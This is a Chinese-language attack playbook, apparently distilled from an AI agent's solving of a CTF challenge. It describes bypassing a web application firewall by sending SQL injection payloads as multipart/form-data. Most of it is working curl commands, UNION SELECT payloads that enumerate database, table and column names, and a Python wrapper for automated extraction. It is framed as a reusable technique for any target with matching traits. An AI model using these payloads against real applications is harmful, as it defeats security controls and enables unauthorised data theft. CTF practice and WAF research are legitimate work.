<!-- usage {"harmed": 2, "helped": 8, "used": 10} -->
<!-- 沉淀自 run 24（对于sql注入拦截绕过的一些小思路总结 http://hbc2.haobachang.com:24672/ 这是sql注入题目waf绕过，找到flag，2026-10-27）。由解出该题的运行蒸馏；flag 字面量已擦除。 -->

# 表单 WAF 绕过：用 multipart/form-data 让 `union select` 原样进后端

## 什么时候用

命中下面这组**可观察特征**时，优先试 Content-Type 切换，而不是继续堆 SQL 变形语法：

1. **单参数表单注入**：页面只有一个输入框（如员工/用户查询），提交后把查询结果渲染成 HTML 表格 `<table><tbody><tr><td>`。响应里出现固定结构的状态条，例如 `<div class="notice blocked">…已被 WAF 拦截</div>`、`<div class="notice error">…`，以及无 notice 的正常结果三种形态。
2. **布尔对照成立**：`id=1 and 1=1` 返回 1 行，`id=1 and 1=2` 返回 0 行；`order by 4` 正常、`order by 5` 报 `error`。说明参数进了 SQL 且结果可控。
3. **WAF 的判定是"组合关键字"而不是"危险字符"**：单独发 `union` 或单独发 `select` 不拦（返回 SQL 语法错 `error`），而 `union` 与 `select` 拼在一起就 `blocked`。
4. **拦截只对特定编码通道生效**：同一 payload 用 `application/x-www-form-urlencoded` 或 GET query 发出去是 `blocked`；换成 `multipart/form-data` 就正常执行。

把 1～4 放在一起看，结论是：WAF 站在应用前面，但**只解析它认识的那几种 Content-Type**；把同样的键值塞进 multipart 分段，WAF 解析不到字段，后端框架（Flask `request.form`、PHP `$_POST`）却照样解析出 `id`。这不是 SQL 语法层面的绕过，是**解析层不一致**。

## 怎么做

**第 0 步：固定两个可重复判定的探针。** 一个走 urlencoded，一个走 multipart，其余完全相同：

```bash
URL="http://<target>/"
P='1 union select 1,2,3,4'

# urlencoded：预期被视为攻击流量
curl -s -X POST --data-urlencode "id=$P" "$URL" | grep -oE '<div class="notice [^"]*">[^<]*</div>'

# multipart：预期被放行
curl -s -X POST -F "id=$P" "$URL" | grep -E '<td>|<div class="notice'
```

只要第二行出现 `<td>1</td><td>2</td>…` 数字回显、第一行出现 blocked 文案，这个绕过就成立，后续所有 payload 都走 `-F`。

**第 1 步：确认列数与回显位。** `-F "id=1 order by N"` 递增到报错，得到列数；再 `-F "id=0 union select 1,2,3,4"` 看哪几列出现在表格里。用不存在的基值（如 `0`）当左半边，避免原查询那行混进结果。

**第 2 步：枚举元数据。** 把表名/列名塞进已确认可回显的那一列：

```bash
curl -s -X POST -F "id=0 union select 1,database(),version(),4" "$URL"
curl -s -X POST -F "id=0 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()" "$URL"
curl -s -X POST -F "id=0 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name='<table>'" "$URL"
```

**第 3 步：批量与解析。** 用一个薄封装把"发 multipart → 抽取 `<tbody>` 里的单元格"固化成函数，避免每次手抠 HTML。骨架：

```python
import re, subprocess
def q(payload):
    body = subprocess.run(["curl", "-s", "--max-time", "25", "-X", "POST",
                           "-F", "id=" + payload, URL],
                          capture_output=True).stdout.decode("utf-8", "replace")
    m = re.search(r"<tbody>(.*?)</tbody>", body, re.S)
    if not m:
        n = re.search(r'<div class="notice [^"]*">([^<]*)</div>', body)
        return "NOTICE:" + (n.group(1) if n else "?")
    return " ;; ".join("|".join(c.strip() for c in re.findall(r"<td>(.*?)</td>", r, re.S))
                       for r in re.findall(r"<tr>(.*?)</tr>", m.group(1), re.S))
```

有了它，取目标数据就是一条 `q("0 union select 1,2,3,<col> from <table>")`。如果返回值被截断，用 `substr()`/`limit 1 offset N` 分片取。

## 坑

- **不要继续在 SQL 语法上做变形**。`UnIoN SeLeCt`、`union/**/select`、`union%0aselect`（含 `%0b/%0c/%09/%0d`）、`/*!50000*/`、`union(select…)` 全部实测仍返回 `blocked`。验证方式就是同一 payload 在 urlencoded 通道跑一遍看 notice。既然单独关键字放行、组合拦截，说明对方做了大小写归一与注释剥离，再变形基本是白费时间。
- **不要用 `-d` / `--data` / `--data-urlencode` 期待绕过**。这几个在 curl 里都产出 `application/x-www-form-urlencoded`，正好是 WAF 检查的那一类。只有 `-F` 才生成带 boundary 的 multipart。
- **不要用 GET 复现同样的"绕过"**。本方法只作用于 POST body；query string 没有 multipart 形态。
- **不要用 `id=1` 做 UNION 的左半边**。原查询会命中一行，结果表里多出一行干扰判读，尤其会让人误以为"回显了但值不对"。
- **Windows 上判定异常先换客户端**。`Invoke-WebRequest` 经操作员代理时可能返回 502/空响应，把 WAF 的 blocked 和网络失败混在一起；用 `curl.exe` 并带 `-o /dev/null -w '%{http_code} %{size_download}'` 分离这两类失败。

## 边界

- 只对"WAF 明摆着只解析 urlencoded/GET"的目标成立。若 WAF 是能解析 multipart 的网关（如带 multipart 解析规则的 ModSecurity/CRS），或应用先把原始 body 交给自研过滤器再审，本方法失效——**这一类失效本次未验证**。
- 依赖后端把 multipart 字段当普通表单字段读取（Flask `request.form`、PHP `$_POST` 属此类）；只读 JSON body 或原始流的端点不适用。**未逐一验证**。
- 本次只在 MySQL/MariaDB 语法族上验证（`information_schema`、`group_concat`、`database()`）；其他数据库的元数据表名/函数不同，payload 需替换。
- 现成证据只来自单次运行，目标实例已下线（复测时 TCP connect 失败）。整套结论的复现前提是目标仍在线且 WAF 配置未变。
